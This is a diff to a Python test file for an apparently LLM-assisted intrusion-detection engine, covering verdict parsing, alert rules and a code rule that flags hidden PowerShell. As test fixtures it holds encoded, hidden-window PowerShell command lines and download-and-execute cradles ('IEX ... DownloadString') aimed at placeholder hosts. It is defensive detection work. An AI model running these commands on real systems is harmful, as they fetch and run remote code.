@@ -15,9 +15,10 @@ import unittest
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, ROOT)
 
-from submission import cases  # noqa: E402
-from submission.baseline import Fleet, Triage  # noqa: E402
+from submission import cases, config, experts  # noqa: E402
+from submission.baseline import Candidate, Fleet, Triage  # noqa: E402
 from submission.engine import Engine, Wave, parse_verdict  # noqa: E402
+from submission.llm import LlamaServer, ServerError  # noqa: E402
 from submission.state import MachineState, norm_path, ts_seconds, user_text  # noqa: E402
 
 N = [0]
@@ -58,15 +59,17 @@ class FakeServer:
     """Answers 'attack' when the case mentions the marker, 'normal' otherwise."""
 
     def __init__(self, marker="evil.exe"):
-        self.marker, self.calls = marker, []
+        self.marker, self.calls, self.texts = marker, [], []
+        self.stopping = False
 
     def chat(self, messages, max_tokens, slot, grammar=None, timeout=None):
         text = messages[-1]["content"]
         self.calls.append(slot)
+        self.texts.append((slot, text))
         if slot == 1:
             return {"text": "Attack: x\nWhy this event: y\nChain: a -> b\nEvidence: z", "wall_s": 0.0}
         verdict = "attack" if self.marker in text else "normal"
-        return {"text": '{"verdict": "%s", "confidence": 90}' % verdict, "wall_s": 0.0}
+        return {"text": "%s 90" % verdict, "wall_s": 0.0}
 
     def alive(self):
         return True
@@ -82,8 +85,10 @@ class Parsing(unittest.TestCase):
         self.assertIsNone(cases.decode_ps("powershell -File x.ps1"))
 
     def test_verdict_parsing(self):
-        self.assertEqual(parse_verdict('{"verdict": "attack", "confidence": 77}'), ("attack", 77))
-        self.assertEqual(parse_verdict("garbage"), ("invalid", 0))
+        self.assertEqual(parse_verdict("attack 77"), ("attack", 77))
+        self.assertEqual(parse_verdict("normal 100"), ("normal", 100))
+        for bad in ("garbage", "attack", "attack high", "maybe 50", ""):
+            self.assertEqual(parse_verdict(bad), ("invalid", 0))
 
     def test_paths_and_users(self):
         self.assertEqual(norm_path("\\Device\\HarddiskVolume1\\Temp\\A.exe"), norm_path("C:\\temp\\a.exe"))
@@ -160,12 +165,18 @@ class EngineRules(unittest.TestCase):
         known = {e for p in wave.state.procs.values() for e, _, _ in p.events} | {start["id"]}
         self.assertTrue(set(ids) <= known)                    # only delivered events of the tree
 
-    def test_one_alert_per_process_tree(self):
-        root = pstart("wmiprvse.exe", "evil.exe", "P1")
+    def test_children_of_an_alerted_process_are_still_judged(self):
+        root = pstart("explorer.exe", "evil.exe", "P1", parent_actor="X1")
         child = pstart("evil.exe", "whoami.exe", "P2", parent_actor="P1")    # its case mentions evil.exe too
         cb, wave, _ = self.run_wave([root, child])
-        self.assertEqual(cb.alerts, [root["id"]])
-        self.assertEqual(wave.stats["skipped_alerted"] + wave.stats["judged"], 2)
+        self.assertEqual(cb.alerts, [root["id"], child["id"]])                # an early alert must not hide the next step
+
+    def test_one_alert_per_process(self):
+        start = pstart("wmiprvse.exe", "evil.exe", "P1", parent_actor="W1")
+        flows = [flow("C:\\x\\evil.exe", "P1", "53.1.2.3", port) for port in (443, 8080)]
+        cb, wave, _ = self.run_wave([start] + flows)
+        self.assertEqual(cb.alerts, [start["id"]])                             # its later connections skip the model
+        self.assertEqual(wave.stats["skipped_alerted"], 2)
 
     def test_cancelled_wave_does_nothing(self):
         server, cb = FakeServer(), Callbacks()
@@ -193,7 +204,96 @@ class EngineRules(unittest.TestCase):
         with engine.lock:                                      # queue both before the worker sees the wave
             for e in (pstart("a.exe", "common.exe", "P1"), pstart("a.exe", "rare.exe", "P2")):
                 engine.submit(wave, tri.observe(e, wave.state.add(e)))
-            self.assertEqual(wave.queue[0][3].pair, ("a.exe", "rare.exe"))
+            self.assertEqual(wave.queue[0][-1].pair, ("a.exe", "rare.exe"))
+
+    def test_expert_cases_first_and_their_reasons_reach_the_explanation(self):
+        fleet = Fleet(None)
+        fleet.machines, fleet.pairs = ["m1", "m2"], {"wmiprvse.exe|powershell.exe": [0, 1]}
+        server, cb = FakeServer(marker="powershell"), Callbacks()
+        engine = Engine(server)
+        wave = Wave(machine="h", callbacks=cb, state=MachineState("h"))
+        tri = Triage("h", fleet)
+        tri.live = True
+        rare = pstart("explorer.exe", "notepad.exe", "P1", ts="2000-01-01T10:00:00.000-04:00")
+        ps = pstart("wmiprvse.exe", "powershell.exe", "P2", ts="2000-01-01T10:00:05.000-04:00",
+                    cmd="powershell -noP -sta -w 1 -enc " + base64.b64encode("Get-Date".encode("utf-16le")).decode())
+        with engine.lock:                                      # queue both before the worker sees the wave
+            for e in (rare, ps):
+                engine.submit(wave, tri.observe(e, wave.state.add(e)))
+            self.assertEqual(wave.queue[0][-1].event["id"], ps["id"])        # later and more common, but recognised
+            self.assertEqual(wave.stats["expert_cases"], 1)
+        engine.start_wave(wave)
+        deadline = time.time() + 5
+        while time.time() < deadline and not cb.explanations:
+            time.sleep(0.02)
+        self.assertEqual(cb.alerts, [ps["id"]])
+        explain_text = [t for slot, t in server.texts if slot == 1][0]
+        self.assertIn("Facts checked by code: PowerShell started by wmiprvse.exe; -EncodedCommand; hidden window; -NoProfile", explain_text)
+
+    def test_solution_2_expert_raises_at_once_and_the_model_only_explains(self):
+        self.addCleanup(setattr, config, "EXPERT_RAISES", config.EXPERT_RAISES)
+        config.EXPERT_RAISES = True
+        ps = pstart("wmiprvse.exe", "powershell.exe", "P2", parent_actor="W1",
+                    cmd="powershell -noP -sta -w 1 -enc " + base64.b64encode("Get-Date".encode("utf-16le")).decode())
+        follow = flow("C:\\x\\powershell.exe", "P2", "53.1.2.3", 443)
+        other = pstart("explorer.exe", "evil.exe", "P3", parent_actor="X1")
+        cb, wave, server = self.run_wave([ps, follow, other])                 # the model says attack only for evil.exe
+        self.assertEqual(cb.alerts, [ps["id"], other["id"]])
+        self.assertEqual(wave.stats["expert_alerts"], 1)
+        self.assertEqual(wave.stats["skipped_alerted"], 1)                     # its connection skips the model
+        verdict_texts = [t for slot, t in server.texts if slot == 0]
+        self.assertEqual(len(verdict_texts), 1)                                # only the unrecognised case was judged
+        self.assertIn("New process: evil.exe", verdict_texts[0])
+        explain_text = [t for slot, t in server.texts if slot == 1 and "powershell" in t.lower()][0]
+        self.assertIn("A code rule raised this alert.", explain_text)
+        self.assertIn("Facts checked by code: PowerShell started by wmiprvse.exe", explain_text)
+        self.assertEqual(len(cb.explanations), 2)
+
+
+class ExpertRules(unittest.TestCase):
+    def cand(self, parent, child, cmd, kind="process"):
+        e = pstart(parent, child, "P1", cmd=cmd)
+        return Candidate(e, kind, (parent, child), 0, 61, 0.0)
+
+    def test_hidden_powershell_catches_the_three_delivery_types(self):
+        blob = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x/a')".encode("utf-16le")).decode()
+        wmi = self.cand("wmiprvse.exe", "powershell.exe", "powershell -noP -sta -w 1 -enc " + blob)
+        office = self.cand("winword.exe", "cmd.exe", "cmd.exe /k powershell.exe -NoP -sta -NonI -W Hidden "
+                                                     "$e=(New-Object System.Net.WebClient).DownloadString('http://x')")
+        batch = self.cand("cmd.exe", "powershell.exe", "powershell  -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIA")
+        for c in (wmi, office, batch):
+            self.assertTrue(experts.hidden_powershell(c), c.event["properties"]["command_line"])
+        self.assertEqual(experts.hidden_powershell(wmi)[0], "PowerShell started by wmiprvse.exe")
+
+    def test_hidden_powershell_ignores_ordinary_powershell(self):
+        for cmd in ('powershell -c "Get-Service lwabeat"',            # the testbed's own monitoring
+                    "powershell -NoProfile -File C:\\scripts\\backup.ps1",   # one marker only
+                    "powershell -ExecutionPolicy Bypass -File a.ps1"):
+            self.assertEqual(experts.hidden_powershell(self.cand("svchost.exe", "powershell.exe", cmd)), (), cmd)
+        self.assertEqual(experts.hidden_powershell(self.cand("explorer.exe", "notepad.exe", "-enc -w hidden")), ())
+
+
+class ServerShutdown(unittest.TestCase):
+    """At exit, stop() cuts off the model call in flight; that must not start a new server (seen on Windows)."""
+
+    def test_no_start_after_stop(self):
+        server = LlamaServer("/nonexistent/llama-server", "/nonexistent/model.gguf")
+        server.stop()
+        with self.assertRaises(ServerError):
+            server.start()
+
+    def test_engine_does_not_restart_a_stopped_server(self):
+        server = FakeServer()
+        server.alive = lambda: False
+        started = []
+        server.start = lambda: started.append(1)
+        engine = Engine(server)
+        server.stopping = True
+        engine._recover()
+        self.assertEqual(started, [])
+        server.stopping = False
+        engine._recover()
+        self.assertEqual(started, [1])
 
 
 if __name__ == "__main__":
